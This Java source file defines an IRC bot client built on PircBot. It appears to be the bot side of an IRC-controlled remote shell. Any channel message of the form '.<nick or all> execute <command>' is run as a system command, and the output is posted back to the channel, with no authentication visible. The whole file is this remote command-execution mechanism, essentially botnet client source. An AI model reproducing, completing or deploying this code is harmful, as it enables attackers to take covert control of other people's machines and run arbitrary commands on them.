package client;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.Scanner;

import org.jibble.pircbot.PircBot;

import util.Executor;

public class Client extends PircBot {
	private String nameSet;
	public Executor exec = new Executor();
	public Client(String name) {
		this.setName(name);

	}
	
	public String actualNick() {
		return "";//this.getNick().substring()
	}
	
	public void setVariableName(String nameSet) {
		this.nameSet = nameSet;
	}

	public void onMessage(String channel, String sender, String login, String hostname, String message) {
		if (message.charAt(0) == '.') {
			//System.out.println("command detected");
			message = message.substring(1, message.length());
			String[] words = message.split(" ");
			System.out.println("The following is the nick:" + this.getNick() );
			if (words.length > 0 && (words[0].equals(this.getNick()) || words[0].equals("all"))) {
				System.out.println("command directed to me");
				if (words.length > 2 && words[1].equals("execute")) {
					System.out.println("executing command");
					String command = message.substring(message.indexOf("execute ") + 8, message.length());
					exec.executeCommand(command);
					
					ArrayList<String> output = exec.getOutput();
					for(String ab : output) {
					sendMessage(channel, ab);
					System.out.println(ab);
					}
				}

			}

		}

	}
	
	
	private void executeCommand(String command) {
	    try {
	        returnOutput(command);
	        Process process = Runtime.getRuntime().exec(command);
	        logOutput(process.getInputStream(), "");
	        logOutput(process.getErrorStream(), "Error: ");
	        process.waitFor();
	    } catch (Exception e) {
	        e.printStackTrace();
	    }
	}

	private void logOutput(InputStream inputStream, String prefix) {
	    new Thread(() -> {
	        Scanner scanner = new Scanner(inputStream, "UTF-8");
	        while (scanner.hasNextLine()) {
	            synchronized (this) {
	                returnOutput(prefix + scanner.nextLine());
	            }
	        }
	        scanner.close();
	    }).start();
	}

	private synchronized void returnOutput(String message) {
	    System.out.println(message);
	}
}
